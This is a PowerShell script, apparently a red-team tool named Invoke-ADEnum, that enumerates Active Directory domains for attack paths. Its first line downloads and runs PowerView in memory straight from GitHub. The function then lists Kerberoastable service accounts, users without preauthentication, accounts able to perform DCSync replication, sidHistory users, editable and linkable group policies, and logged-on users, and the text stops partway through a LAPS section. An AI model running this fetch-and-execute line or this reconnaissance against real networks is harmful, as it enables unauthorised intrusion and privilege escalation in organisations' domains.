iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')

function Invoke-ADEnum
{
<#

.SYNOPSIS
Active Directory PowerView Enumerator

.PARAMETER Domain
The Domain to enumerate for (requires you specify a Server)

.PARAMETER Server
The DC to bind to (requires you specify a Domain)

.EXAMPLE - Run for each domain you can find
Invoke-ADEnum

.EXAMPLE - Run for a specific Domain/DC
Invoke-ADEnum -Domain <domain FQDN> -Server <DC FQDN or IP>

#>

	[CmdletBinding()] Param(

		[Parameter (Mandatory=$False, Position = 0, ValueFromPipeline=$true)]
		[String]
		$Domain,

		[Parameter (Mandatory=$False, Position = 1, ValueFromPipeline=$true)]
		[String]
		$Server

	)
	
	if($Domain -OR $Server) {
		$DomainParam = [Parameter(Mandatory=$True, Position=1, ValueFromPipeline=$true)][String]$Domain
		$ServerParam = [Parameter(Mandatory=$True, Position=2, ValueFromPipeline=$true)][String]$Server
	}

	$ErrorActionPreference = "SilentlyContinue"
	
	Write-Host ""
	Write-Host "Current Domain:" -ForegroundColor Cyan
	if($Domain -AND $Server) {
		Get-NetDomain -Domain $Domain | Select Name, Forest, Parent, Children, DomainControllers | ft -Autosize -Wrap
	}
	else{
		Get-NetDomain | Select Name, Forest, Parent, Children, DomainControllers | ft -Autosize -Wrap
	}

	Write-Host ""
	Write-Host "Parent and Child Domains:" -ForegroundColor Cyan
	if($Domain -AND $Server) {
		$DomainForest = (Get-NetDomain -Domain $Domain | Select-Object -ExpandProperty Forest)
		Get-NetDomain -Domain $DomainForest | Select Name, Forest, Parent, Children, DomainControllers | ft -Autosize -Wrap
	}
	else{
		$DomainForest = (Get-NetDomain | Select-Object -ExpandProperty Forest)
		Get-NetDomain -Domain $DomainForest | Select Name, Forest, Parent, Children, DomainControllers | ft -Autosize -Wrap
	}
	
	# All Domains
	$ParentDomain = (Get-NetDomain | Select-Object -ExpandProperty Forest | Select-Object -ExpandProperty Name)
	$ChildDomains = (Get-NetDomain -Domain $ParentDomain | Select-Object -ExpandProperty Children | Select-Object -ExpandProperty Name)

	if($ChildDomains){
		$AllDomains = $ParentDomain + "`n"
		foreach($ChildDomain in $ChildDomains){
			$AllDomains += $ChildDomain + "`n"
		}
		$AllDomains = ($AllDomains | Out-String) -split "`n"
		$AllDomains = $AllDomains.Trim()
		$AllDomains = $AllDomains | Where-Object { $_ -ne "" }
	}

	else{$AllDomains = $ParentDomain}
	
	# Trust Domains (save to variable)
	
	if($Domain -AND $Server) {
		$TrustTargetNames = (Get-DomainTrust -Domain $Domain -Server $Server).TargetName
		$TrustTargetNames = ($TrustTargetNames | Out-String) -split "`n"
		$TrustTargetNames = $TrustTargetNames.Trim()
		$TrustTargetNames = $TrustTargetNames | Where-Object { $_ -ne "" }
		$TrustTargetNames = $TrustTargetNames | Sort-Object -Unique
		$TrustTargetNames = $TrustTargetNames | Where-Object { $_ -notin $Domain }
	}
	
	else{
		$TrustTargetNames = foreach($AllDomain in $AllDomains){(Get-DomainTrust -Domain $AllDomain).TargetName}
		$TrustTargetNames = ($TrustTargetNames | Out-String) -split "`n"
		$TrustTargetNames = $TrustTargetNames.Trim()
		$TrustTargetNames = $TrustTargetNames | Where-Object { $_ -ne "" }
		$TrustTargetNames = $TrustTargetNames | Sort-Object -Unique
		$TrustTargetNames = $TrustTargetNames | Where-Object { $_ -notin $AllDomains }
	}
	
	# Remove Outbound Trust from $AllDomains
	
	if($Domain -AND $Server) {
		$OutboundTrusts = Get-DomainTrust -Domain $Domain | Where-Object { $_.TrustDirection -eq 'Outbound' } | Select-Object -ExpandProperty TargetName
	}
	
	else{
		$OutboundTrusts = foreach($AllDomain in $AllDomains){Get-DomainTrust -Domain $AllDomain | Where-Object { $_.TrustDirection -eq 'Outbound' } | Select-Object -ExpandProperty TargetName}
	}
	
	$AllDomains += $TrustTargetNames
	$PlaceHolderDomains = $AllDomains
	$AllDomains = $AllDomains | Where-Object { $_ -notin $OutboundTrusts }

	Write-Host ""
	Write-Host "Domain SIDs:" -ForegroundColor Cyan
	if($Domain -AND $Server) {
		$DomainSID = Get-DomainSID -Domain $Domain -Server $Server | ft -Autosize -Wrap
		
		[PSCustomObject]@{
			DomainName = $Domain
			DomainSID  = $DomainSID
		} | Format-Table -AutoSize -Wrap
	}
	
	else{
		$AllDomains | ForEach-Object {
			$DomainName = $_
			$DomainSID = Get-DomainSID -Domain $DomainName
			[PSCustomObject]@{
				DomainName = $DomainName
				DomainSID  = $DomainSID
			}
		} | Format-Table -AutoSize -Wrap
	}
	
	Write-Host ""
	Write-Host "Domains for the current forest:" -ForegroundColor Cyan
	Get-ForestDomain | Format-Table -AutoSize -Wrap

	Write-Host ""
	Write-Host "Forest Global Catalog:" -ForegroundColor Cyan
	Get-ForestGlobalCatalog | Select Name, Forest, Domain, IPAddress | Format-Table -AutoSize -Wrap

	Write-Host ""
	Write-Host "Domain Trusts:" -ForegroundColor Cyan
	if($Domain -AND $Server) {
		Get-DomainTrust -Domain $Domain -Server $Server | Format-Table -AutoSize -Wrap
	}
	
	else{
		foreach($AllDomain in $AllDomains){Get-DomainTrust -Domain $AllDomain | Format-Table -AutoSize -Wrap}
	}

	Write-Host ""
	Write-Host "Domain Controllers:" -ForegroundColor Cyan
	if($Domain -AND $Server) {
		Get-NetDomainController -Domain $Domain | Select Name, Forest, Domain, IPAddress | ft -Autosize -Wrap
	}
	else{
		foreach($AllDomain in $AllDomains){Get-NetDomainController -Domain $AllDomain | Select Name, Forest, Domain, IPAddress | ft -Autosize -Wrap}
	}

	Write-Host ""
	Write-Host "Servers:" -ForegroundColor Cyan
	if($Domain -AND $Server) {
		Get-DomainComputer -Properties name, samaccountname, DnsHostName, operatingsystem -Domain $Domain -Server $Server -OperatingSystem "*Server*" | sort -Property DnsHostName | Select-Object -Property name, samaccountname, @{n='ipv4address';e={(Resolve-DnsName -Name $_.DnsHostName -Type A).IPAddress}}, DnsHostName, operatingsystem | ft -Autosize -Wrap
	}
	else{
		foreach($AllDomain in $AllDomains){Get-DomainComputer -Properties name, samaccountname, DnsHostName, operatingsystem -Domain $AllDomain -OperatingSystem "*Server*" | sort -Property DnsHostName | Select-Object -Property name, samaccountname, @{n='ipv4address';e={(Resolve-DnsName -Name $_.DnsHostName -Type A).IPAddress}}, DnsHostName, operatingsystem | ft -Autosize -Wrap}
	}

	Write-Host ""
	Write-Host "Workstations:" -ForegroundColor Cyan
	if($Domain -AND $Server) {
		Get-DomainComputer -Properties name, samaccountname, DnsHostName, operatingsystem -Domain $Domain -Server $Server | Where-Object { $_.OperatingSystem -notlike "*Server*" } | sort -Property DnsHostName | Select-Object -Property name, samaccountname, @{n='ipv4address';e={(Resolve-DnsName -Name $_.DnsHostName -Type A).IPAddress}}, DnsHostName, operatingsystem | ft -Autosize -Wrap
	}
	else{
		foreach($AllDomain in $AllDomains){Get-DomainComputer -Properties name, samaccountname, DnsHostName, operatingsystem -Domain $AllDomain | Where-Object { $_.OperatingSystem -notlike "*Server*" } | sort -Property DnsHostName | Select-Object -Property name, samaccountname, @{n='ipv4address';e={(Resolve-DnsName -Name $_.DnsHostName -Type A).IPAddress}}, DnsHostName, operatingsystem | ft -Autosize -Wrap}
	}

	#Write-Host ""
	#Write-Host "All Groups:" -ForegroundColor Cyan
	#foreach($AllDomain in $AllDomains){Get-DomainGroup -Domain $AllDomain | select SamAccountName, objectsid, @{Name='Members';Expression={(Get-DomainGroupMember -Recurse -Identity $_.SamAccountname).MemberDistinguishedName -join ' - '}} | ft -Autosize -Wrap}

	Write-Host ""
	Write-Host "Admin Groups:" -ForegroundColor Cyan
	if($Domain -AND $Server) {
		Get-DomainGroup -Domain $Domain -Server $Server | where Name -like "*Admin*" | select SamAccountName, objectsid, @{Name="Domain";Expression={$Domain}}, @{Name='Members';Expression={(Get-DomainGroupMember -Domain $Domain -Server $Server -Recurse -Identity $_.SamAccountname).MemberName -join ' - '}} | Where-Object { $_.Members } | ft -Autosize -Wrap
	}
	else{
		foreach($AllDomain in $AllDomains){Get-DomainGroup -Domain $AllDomain | where Name -like "*Admin*" | select SamAccountName, objectsid, @{Name="Domain";Expression={$AllDomain}}, @{Name='Members';Expression={(Get-DomainGroupMember -Domain $AllDomain -Recurse -Identity $_.SamAccountname).MemberName -join ' - '}} | Where-Object { $_.Members } | ft -Autosize -Wrap}
	}

	if($TrustTargetNames){
		Write-Host ""
		Write-Host "Groups that contain users outside of its domain and return its members:" -ForegroundColor Cyan
		foreach($TrustTargetName in $TrustTargetNames){
			if($Domain -AND $Server) {
				Get-DomainForeignGroupMember -Domain $TrustTargetName -Server $Server | Select-Object GroupDomain, GroupName, GroupDistinguishedName, MemberDomain, @{Name="Member|GroupName";Expression={(ConvertFrom-SID $_.MemberName)}}, @{Name="Members";Expression={(Get-DomainGroupMember -Domain $Domain -Server $Server -Recurse -Identity (ConvertFrom-SID $_.MemberName)).MemberName -join ' - '}}, @{Name="SID";Expression={($_.MemberName)}} | Format-Table -AutoSize -Wrap
			}
			
			else{
				Get-DomainForeignGroupMember -Domain $TrustTargetName | Select-Object GroupDomain, GroupName, GroupDistinguishedName, MemberDomain, @{Name="Member|GroupName";Expression={(ConvertFrom-SID $_.MemberName)}}, @{Name="Members";Expression={(Get-DomainGroupMember -Recurse -Identity (ConvertFrom-SID $_.MemberName)).MemberName}}, @{Name="SID";Expression={($_.MemberName) -join ' - '}} | Format-Table -AutoSize -Wrap
			}
		}
	}

	Write-Host ""
	Write-Host "Other Groups:" -ForegroundColor Cyan
	if($Domain -AND $Server) {
		Get-DomainGroup -Domain $Domain -Server $Server | Where-Object { $_.SamAccountName -notlike "*Admin*" } | select SamAccountName, objectsid, @{Name="Domain";Expression={$Domain}}, @{Name='Members';Expression={(Get-DomainGroupMember -Domain $Domain -Server $Server -Recurse -Identity $_.SamAccountname).MemberName -join ' - '}}, @{Name='MembersDistinguishedName';Expression={(Get-DomainGroupMember -Domain $Domain -Server $Server -Recurse -Identity $_.SamAccountname).MemberDistinguishedName -join ' - '}} | Where-Object { $_.Members } | ft -Autosize -Wrap
	}
	else{
		foreach($AllDomain in $AllDomains){Get-DomainGroup -Domain $AllDomain | Where-Object { $_.SamAccountName -notlike "*Admin*" } | select SamAccountName, objectsid, @{Name="Domain";Expression={$AllDomain}}, @{Name='Members';Expression={(Get-DomainGroupMember -Domain $AllDomain -Recurse -Identity $_.SamAccountname).MemberName -join ' - '}}, @{Name='MembersDistinguishedName';Expression={(Get-DomainGroupMember -Domain $AllDomain -Recurse -Identity $_.SamAccountname).MemberDistinguishedName -join ' - '}} | Where-Object { $_.Members } | ft -Autosize -Wrap}
	}

	Write-Host ""
	Write-Host "Groups by keyword:" -ForegroundColor Cyan
	if($Domain -AND $Server) {
		Get-DomainGroup -Domain $Domain -Server $Server -Identity *SQL* | % { Get-DomainGroupMember -Domain $Domain -Server $Server -Identity $_.distinguishedname | Select-Object groupname, membername, @{Name="Domain";Expression={$Domain}} } | Out-String
		Get-DomainGroup -Domain $Domain -Server $Server -Identity *Exchange* | % { Get-DomainGroupMember -Domain $Domain -Server $Server -Identity $_.distinguishedname | Select-Object groupname, membername, @{Name="Domain";Expression={$Domain}} } | Out-String
		Get-DomainGroup -Domain $Domain -Server $Server -Identity *Desktop* | % { Get-DomainGroupMember -Domain $Domain -Server $Server -Identity $_.distinguishedname | Select-Object groupname, membername, @{Name="Domain";Expression={$Domain}} } | Out-String
		Get-DomainGroup -Domain $Domain -Server $Server -Identity *VEEAM* | % { Get-DomainGroupMember -Domain $Domain -Server $Server -Identity $_.distinguishedname | Select-Object groupname, membername, @{Name="Domain";Expression={$Domain}} } | Out-String
		Get-DomainGroup -Domain $Domain -Server $Server -Identity *PSM* | % { Get-DomainGroupMember -Domain $Domain -Server $Server -Identity $_.distinguishedname | Select-Object groupname, membername, @{Name="Domain";Expression={$Domain}} } | Out-String
		Get-DomainGroup -Domain $Domain -Server $Server -Identity *Password* | % { Get-DomainGroupMember -Domain $Domain -Server $Server -Identity $_.distinguishedname | Select-Object groupname, membername, @{Name="Domain";Expression={$Domain}} } | Out-String
	}
	else{
		foreach($AllDomain in $AllDomains){
			Get-DomainGroup -Domain $AllDomain -Identity *SQL* | % { Get-DomainGroupMember -Identity $_.distinguishedname | Select-Object groupname, membername, @{Name="Domain";Expression={$AllDomain}} } | Out-String
			Get-DomainGroup -Domain $AllDomain -Identity *Exchange* | % { Get-DomainGroupMember -Identity $_.distinguishedname | Select-Object groupname, membername, @{Name="Domain";Expression={$AllDomain}} } | Out-String
			Get-DomainGroup -Domain $AllDomain -Identity *Desktop* | % { Get-DomainGroupMember -Identity $_.distinguishedname | Select-Object groupname, membername, @{Name="Domain";Expression={$AllDomain}} } | Out-String
			Get-DomainGroup -Domain $AllDomain -Identity *VEEAM* | % { Get-DomainGroupMember -Identity $_.distinguishedname | Select-Object groupname, membername, @{Name="Domain";Expression={$AllDomain}} } | Out-String
			Get-DomainGroup -Domain $AllDomain -Identity *PSM* | % { Get-DomainGroupMember -Identity $_.distinguishedname | Select-Object groupname, membername, @{Name="Domain";Expression={$AllDomain}} } | Out-String
			Get-DomainGroup -Domain $AllDomain -Identity *Password* | % { Get-DomainGroupMember -Identity $_.distinguishedname | Select-Object groupname, membername, @{Name="Domain";Expression={$AllDomain}} } | Out-String
		}
	}

	Write-Host ""
	Write-Host "Enterprise Administrators:" -ForegroundColor Cyan
	if($Domain -AND $Server) {
		Get-DomainGroupMember -Domain $Domain -Server $Server -Identity "Enterprise Admins" -Recurse | select GroupDomain,MemberName,MemberSID | ft -Autosize -Wrap
	}
	else{
		foreach($AllDomain in $AllDomains){Get-DomainGroupMember -Domain $AllDomain -Identity "Enterprise Admins" -Recurse | select GroupDomain,MemberName,MemberSID | ft -Autosize -Wrap}
	}

	Write-Host ""
	Write-Host "Domain Administrators:" -ForegroundColor Cyan
	if($Domain -AND $Server) {
		Get-DomainGroupMember -Domain $Domain -Server $Server -Identity "Domain Admins" -Recurse | select GroupDomain,MemberName,MemberSID | ft -Autosize -Wrap
	}
	else{
		foreach($AllDomain in $AllDomains){Get-DomainGroupMember -Domain $AllDomain -Identity "Domain Admins" -Recurse | select GroupDomain,MemberName,MemberSID | ft -Autosize -Wrap}
	}

	Write-Host ""
	Write-Host "Service Accounts:" -ForegroundColor Cyan
	if($Domain -AND $Server) {
		Get-DomainUser -SPN -Domain $Domain -Server $Server | select samaccountname, description, @{Name='Groups';Expression={(Get-DomainGroup -Domain $Domain -Server $Server -UserName $_.samaccountname).Name -join ' - '}}, @{Name="Domain";Expression={$Domain}} | ft -Autosize -Wrap
	}
	else{
		foreach($AllDomain in $AllDomains){Get-DomainUser -SPN -Domain $AllDomain | select samaccountname, description, @{Name='Groups';Expression={(Get-DomainGroup -UserName $_.samaccountname).Name -join ' - '}}, @{Name="Domain";Expression={$AllDomain}} | ft -Autosize -Wrap}
	}

	Write-Host ""
	Write-Host "Users who don't have kerberos preauthentication set:" -ForegroundColor Cyan
	if($Domain -AND $Server) {
		Get-DomainUser -Domain $Domain -Server $Server -PreauthNotRequired | Select-Object samaccountname, @{Name="Domain";Expression={$Domain}} | Format-Table -AutoSize -Wrap
		#Get-DomainUser -UACFilter DONT_REQ_PREAUTH | select samaccountname | Format-Table -AutoSize -Wrap
	}
	else{
		foreach($AllDomain in $AllDomains){Get-DomainUser -Domain $AllDomain -PreauthNotRequired | Select-Object samaccountname, @{Name="Domain";Expression={$AllDomain}} | Format-Table -AutoSize -Wrap}
	}

	Write-Host ""
	Write-Host "Service accounts in 'Domain Admins':" -ForegroundColor Cyan
	if($Domain -AND $Server) {
		Get-DomainUser -Domain $Domain -Server $Server -SPN | ?{$_.memberof -match 'Domain Admins'} | Select-Object samaccountname, @{Name="Domain";Expression={$Domain}} | Format-Table -AutoSize -Wrap
	}
	else{
		foreach($AllDomain in $AllDomains){Get-DomainUser -Domain $AllDomain -SPN | ?{$_.memberof -match 'Domain Admins'} | Select-Object samaccountname, @{Name="Domain";Expression={$AllDomain}} | Format-Table -AutoSize -Wrap}
	}

	Write-Host ""
	Write-Host "Users with sidHistory set:" -ForegroundColor Cyan
	if($Domain -AND $Server) {
		Get-DomainUser -Domain $Domain -Server $Server -LDAPFilter '(sidHistory=*)' | Select-Object samaccountname, @{Name="Domain";Expression={$Domain}} | Format-Table -AutoSize -Wrap
	}
	else{
		foreach($AllDomain in $AllDomains){Get-DomainUser -Domain $AllDomain -LDAPFilter '(sidHistory=*)' | Select-Object samaccountname, @{Name="Domain";Expression={$AllDomain}} | Format-Table -AutoSize -Wrap}
	}

	Write-Host ""
	Write-Host "Retrieve *most* users who can perform DC replication (i.e. DCsync):" -ForegroundColor Cyan
	#foreach($AllDomain in $AllDomains){$dcName = "dc=" + $AllDomain.Split("."); $dcName = $dcName -replace " ", ",dc="; Get-DomainObjectAcl "$dcName" -ResolveGUIDs | ? {($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')}}
	if($Domain -AND $Server) {
		$dcName = "dc=" + $Domain.Split(".")
		$dcName = $dcName -replace " ", ",dc="
		Get-DomainObjectAcl "$dcName" -Domain $Domain -Server $Server -ResolveGUIDs |
			? {($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')} |
			select @{Name="SecurityIdentifier"; Expression={ConvertFrom-SID -Server $Server $_.SecurityIdentifier}} |
			ft -AutoSize -Wrap
	}
	else{
		foreach($AllDomain in $AllDomains) {
			$dcName = "dc=" + $AllDomain.Split(".")
			$dcName = $dcName -replace " ", ",dc="
			Get-DomainObjectAcl "$dcName" -ResolveGUIDs |
				? {($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')} |
				select @{Name="SecurityIdentifier"; Expression={ConvertFrom-SID $_.SecurityIdentifier}} |
				ft -AutoSize -Wrap
		}
	}

	Write-Host ""
	Write-Host "Linked DA accounts using name correlation:" -ForegroundColor Cyan
	if($Domain -AND $Server) {
		Get-DomainGroupMember 'Domain Admins' -Domain $Domain -Server $Server | %{Get-DomainUser $_.membername -Domain $Domain -Server $Server -LDAPFilter '(displayname=*)'} | %{$a=$_.displayname.split(' ')[0..1] -join ' '; Get-DomainUser -Domain $Domain -Server $Server -LDAPFilter "(displayname=*$a*)" -Properties displayname,samaccountname} | Select-Object displayname, samaccountname, @{Name="Domain";Expression={$Domain}} | Format-Table -AutoSize -Wrap
	}
	else{
		foreach($AllDomain in $AllDomains){Get-DomainGroupMember 'Domain Admins' -Domain $AllDomain | %{Get-DomainUser $_.membername -LDAPFilter '(displayname=*)'} | %{$a=$_.displayname.split(' ')[0..1] -join ' '; Get-DomainUser -Domain $AllDomain -LDAPFilter "(displayname=*$a*)" -Properties displayname,samaccountname} | Select-Object displayname, samaccountname, @{Name="Domain";Expression={$AllDomain}} | Format-Table -AutoSize -Wrap}
	}

	Write-Host ""
	Write-Host "Domain Policy:" -ForegroundColor Cyan
	if($Domain -AND $Server) {
		(Get-DomainPolicy -Domain $Domain -Server $Server).SystemAccess | Select-Object MinimumPasswordAge, MaximumPasswordAge, MinimumPasswordLength, PasswordComplexity, PasswordHistorySize, LockoutBadCount, ResetLockoutCount, LockoutDuration, RequireLogonToChangePassword, @{Name="Domain"; Expression={$Domain}} | Format-Table -AutoSize -Wrap
	}
	else{
		foreach($AllDomain in $AllDomains){(Get-DomainPolicy -Domain $AllDomain).SystemAccess | Select-Object MinimumPasswordAge, MaximumPasswordAge, MinimumPasswordLength, PasswordComplexity, PasswordHistorySize, LockoutBadCount, ResetLockoutCount, LockoutDuration, RequireLogonToChangePassword, @{Name="Domain"; Expression={$AllDomain}} | Format-Table -AutoSize -Wrap}
	}

	Write-Host ""
	Write-Host "How many computer objects can we create:" -ForegroundColor Cyan
	#foreach($AllDomain in $AllDomains){$dcName = "dc=" + $AllDomain.Split("."); $dcName = $dcName -replace " ", ",dc="; Get-DomainObject -Domain $AllDomain -Identity "$dcName" -Properties ms-DS-MachineAccountQuota}

	if($Domain -AND $Server) {
		$dcName = "dc=" + $Domain.Split(".")
		$dcName = $dcName -replace " ", ",dc="
		$Quota = (Get-DomainObject -Domain $Domain -Server $Server -Identity "$dcName" -Properties ms-DS-MachineAccountQuota) | Select-Object -ExpandProperty ms-DS-MachineAccountQuota
		[pscustomobject]@{
			'Domain' = $Domain
			'Quota' = $Quota
		} | ft -AutoSize
	}
	else{
		$Result = foreach($AllDomain in $AllDomains){
			$dcName = "dc=" + $AllDomain.Split(".")
			$dcName = $dcName -replace " ", ",dc="
			$Quota = (Get-DomainObject -Domain $AllDomain -Identity "$dcName" -Properties ms-DS-MachineAccountQuota) | Select-Object -ExpandProperty ms-DS-MachineAccountQuota
			[pscustomobject]@{
				'Domain' = $AllDomain
				'Quota' = $Quota
			}
		}
		$Result | ft -AutoSize
	}

	Write-Host ""
	Write-Host "Domain OUs:" -ForegroundColor Cyan
	#foreach($AllDomain in $AllDomains){Get-DomainOU -Domain $AllDomain -Properties Name | sort -Property Name | ft -Autosize -Wrap}
	#foreach($AllDomain in $AllDomains){Get-DomainOU -Domain $AllDomain | select name, @{Name='Users';Expression={(Get-DomainGroupMember -Recurse -Identity $_.SamAccountname).MemberDistinguishedName -join ' - '}}, @{Name='Computers';Expression={%(Get-DomainComputer -SearchBase "ldap://$_.distinguishedname") -join ' - '}} | ft -Autosize -Wrap}
	if($Domain -AND $Server) {
		Get-DomainOU -Domain $Domain -Server $Server | ForEach-Object {
			$ou = $_
			$users = (Get-DomainUser -Domain $Domain -Server $Server -SearchBase "LDAP://$($_.DistinguishedName)").samaccountname
			$computers = Get-DomainComputer -Domain $Domain -Server $Server -SearchBase "LDAP://$($_.DistinguishedName)"
			[PSCustomObject]@{
				Name = $ou.Name
				Users = $users -join ' - '
				Computers = ($computers.Name -join ' - ')
				Domain = $Domain
			}
		} | Format-Table -AutoSize -Wrap
	}
	else{
		foreach($AllDomain in $AllDomains){
			Get-DomainOU -Domain $AllDomain | ForEach-Object {
				$ou = $_
				$users = (Get-DomainUser -Domain $AllDomain -SearchBase "LDAP://$($_.DistinguishedName)").samaccountname
				$computers = Get-DomainComputer -Domain $AllDomain -SearchBase "LDAP://$($_.DistinguishedName)"
				[PSCustomObject]@{
					Name = $ou.Name
					Users = $users -join ' - '
					Computers = ($computers.Name -join ' - ')
					Domain = $AllDomain
				}
			} | Format-Table -AutoSize -Wrap
		}
	}

	Write-Host ""
	Write-Host "Logged on users for all machines in any Server OU:" -ForegroundColor Cyan
	if($Domain -AND $Server) {
		Get-DomainOU -Identity *server* -Domain $Domain -Server $Server | %{Get-DomainComputer -Domain $Domain -Server $Server -SearchBase $_.distinguishedname -Properties dnshostname | %{Get-NetLoggedOn -Domain $Domain -Server $Server -ComputerName $_}} | Format-Table -AutoSize -Wrap
	}
	else{
		foreach($AllDomain in $AllDomains){Get-DomainOU -Identity *server* -Domain $AllDomain | %{Get-DomainComputer -SearchBase $_.distinguishedname -Properties dnshostname | %{Get-NetLoggedOn -ComputerName $_}} | Format-Table -AutoSize -Wrap}
	}


	Write-Host ""
	Write-Host "Domain GPOs:" -ForegroundColor Cyan
	if($Domain -AND $Server) {
		Get-DomainGPO -Domain $Domain -Server $Server -Properties DisplayName, gpcfilesyspath | sort -Property DisplayName | Format-Table -AutoSize -Wrap
	}
	else{
		foreach($AllDomain in $AllDomains){Get-DomainGPO -Domain $AllDomain -Properties DisplayName, gpcfilesyspath | sort -Property DisplayName | Format-Table -AutoSize -Wrap}
	}

	Write-Host ""
	Write-Host "Who can create GPOs:" -ForegroundColor Cyan
	if($Domain -AND $Server) {
		#Get-DomainObjectAcl -Identity "CN=Policies,CN=System,DC=dev,DC=cyberbotic,DC=io" -ResolveGUIDs | ? { $_.ObjectAceType -eq "Group-Policy-Container" -and $_.ActiveDirectoryRights -contains "CreateChild" } | % { ConvertFrom-SID $_.SecurityIdentifier }
		$dcName = "dc=" + $Domain.Split(".")
		$dcName = $dcName -replace " ", ",dc="
		Get-DomainObjectAcl -Domain $Domain -Server $Server -Identity "CN=Policies,CN=System,$dcName" -ResolveGUIDs | ? { $_.ObjectAceType -eq "Group-Policy-Container" -and $_.ActiveDirectoryRights -contains "CreateChild" } | % { ConvertFrom-SID $_.SecurityIdentifier -Domain $Domain -Server $Server }
	}
	else{
		foreach($AllDomain in $AllDomains){
			$dcName = "dc=" + $AllDomain.Split(".")
			$dcName = $dcName -replace " ", ",dc="
			Get-DomainObjectAcl -Domain $AllDomain -Identity "CN=Policies,CN=System,$dcName" -ResolveGUIDs | ? { $_.ObjectAceType -eq "Group-Policy-Container" -and $_.ActiveDirectoryRights -contains "CreateChild" } | % { ConvertFrom-SID $_.SecurityIdentifier }
		}
	}

	Write-Host ""
	Write-Host "Who can modify existing GPOs:" -ForegroundColor Cyan
	Write-Host ""
	
	if($Domain -AND $Server) {
		$jSIDdomain = Get-DomainSID -Domain $Domain -Server $Server
		
		$jGPOIDRAW = (Get-DomainGPO -Domain $Domain -Server $Server | Get-DomainObjectAcl -Domain $Domain -Server $Server -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "CreateChild|WriteProperty|GenericAll" -and $_.SecurityIdentifier -match "$jSIDdomain-[\d]{4,10}" })
		
		$jGPOIDs = ($jGPOIDRAW | Select-Object -ExpandProperty ObjectDN | Get-Unique)
		
		if($jGPOIDRAW){
			foreach($jGPOID in $jGPOIDs){
				Write-Host "Name of modifiable Policy: " -ForegroundColor Yellow
				Get-DomainGPO -Domain $Domain -Server $Server -Identity $jGPOID | select displayName, gpcFileSysPath | Format-Table -HideTableHeaders
				Write-Host "Who can edit the policy: " -ForegroundColor Yellow
				echo " "
				$jGPOIDSELECTs = ($jGPOIDRAW | ? {$_.ObjectDN -eq $jGPOID} | Select-Object -ExpandProperty SecurityIdentifier | Select-Object -ExpandProperty Value | Get-Unique)
				foreach($jGPOIDSELECT in $jGPOIDSELECTs){$SID = New-Object System.Security.Principal.SecurityIdentifier("$jGPOIDSELECT"); $objUser = $SID.Translate([System.Security.Principal.NTAccount]); $objUser.Value}
				echo " "
				echo " "
				Write-Host "OUs the policy applies to: " -ForegroundColor Yellow
				Get-DomainOU -Domain $Domain -Server $Server -GPLink "$jGPOID" | select distinguishedName | Format-Table -HideTableHeaders
				echo "======================="
				echo "======================="
				echo " "
			}
		}
	}
	else{
		foreach($AllDomain in $AllDomains){

			$jSIDdomain = Get-DomainSID -Domain $AllDomain
			
			$jGPOIDRAW = (Get-DomainGPO -Domain $AllDomain | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "CreateChild|WriteProperty|GenericAll" -and $_.SecurityIdentifier -match "$jSIDdomain-[\d]{4,10}" })
			
			$jGPOIDs = ($jGPOIDRAW | Select-Object -ExpandProperty ObjectDN | Get-Unique)
			
			if($jGPOIDRAW){
				foreach($jGPOID in $jGPOIDs){
					Write-Host "Name of modifiable Policy: " -ForegroundColor Yellow
					Get-DomainGPO -Domain $AllDomain -Identity $jGPOID | select displayName, gpcFileSysPath | Format-Table -HideTableHeaders
					Write-Host "Who can edit the policy: " -ForegroundColor Yellow
					echo " "
					$jGPOIDSELECTs = ($jGPOIDRAW | ? {$_.ObjectDN -eq $jGPOID} | Select-Object -ExpandProperty SecurityIdentifier | Select-Object -ExpandProperty Value | Get-Unique)
					foreach($jGPOIDSELECT in $jGPOIDSELECTs){$SID = New-Object System.Security.Principal.SecurityIdentifier("$jGPOIDSELECT"); $objUser = $SID.Translate([System.Security.Principal.NTAccount]); $objUser.Value}
					echo " "
					echo " "
					Write-Host "OUs the policy applies to: " -ForegroundColor Yellow
					Get-DomainOU -Domain $AllDomain -GPLink "$jGPOID" | select distinguishedName | Format-Table -HideTableHeaders
					echo "======================="
					echo "======================="
					echo " "
				}
			}

		}
	}

	Write-Host ""
	Write-Host "Who can link GPOs:" -ForegroundColor Cyan
	if($Domain -AND $Server) {
		#foreach($AllDomain in $AllDomains){$gpolinkresult = (Get-DomainOU -Domain $AllDomain | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" }); $gpolinkresult | select ObjectDN,ActiveDirectoryRights,ObjectAceType,SecurityIdentifier | fl; $SIDresolvesto = ConvertFrom-SID $gpolinkresult.SecurityIdentifier ; Write-Host "SecurityIdentifier resolves to " -NoNewline; Write-Host "$SIDresolvesto" -ForegroundColor Yellow}
		$gpolinkresult = (Get-DomainOU -Domain $Domain -Server $Server | Get-DomainObjectAcl -Domain $Domain -Server $Server -ResolveGUIDs | ? { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" })
		$gpolinkresult | Select-Object ObjectDN, ActiveDirectoryRights, ObjectAceType, @{Name="SecurityIdentifier";Expression={$_.SecurityIdentifier}}, @{Name="SID_Resolves_To";Expression={(ConvertFrom-SID -Domain $Domain -Server $Server $_.SecurityIdentifier)}} | Format-List
	}
	else{
		foreach($AllDomain in $AllDomains){
			$gpolinkresult = (Get-DomainOU -Domain $AllDomain | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" })
			$gpolinkresult | Select-Object ObjectDN, ActiveDirectoryRights, ObjectAceType, @{Name="SecurityIdentifier";Expression={$_.SecurityIdentifier}}, @{Name="SID_Resolves_To";Expression={(ConvertFrom-SID $_.SecurityIdentifier)}} | Format-List
		}
	}


	Write-Host ""
	Write-Host "LAPS GPOs:" -ForegroundColor Cyan
	if($Domain -AND $Server) {
